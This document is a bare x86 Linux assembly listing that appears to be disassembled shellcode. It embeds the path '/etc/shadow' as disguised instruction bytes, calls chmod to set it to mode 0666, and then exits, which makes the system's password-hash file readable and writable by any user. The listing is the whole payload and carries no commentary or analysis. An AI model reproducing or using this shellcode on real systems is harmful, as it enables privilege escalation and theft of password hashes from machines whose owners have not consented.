global _start
section .text
_start:
cdq
push byte +0xf
pop eax
push edx
call dword 0x16
das
gs jz 0x71
das
jnc 0x79
popad
fs outsd
ja 0x16
pop ebx
push dword 0x1b6
pop ecx
int 0x80 		
push byte +0x1 	
pop eax 		
int 0x80 		
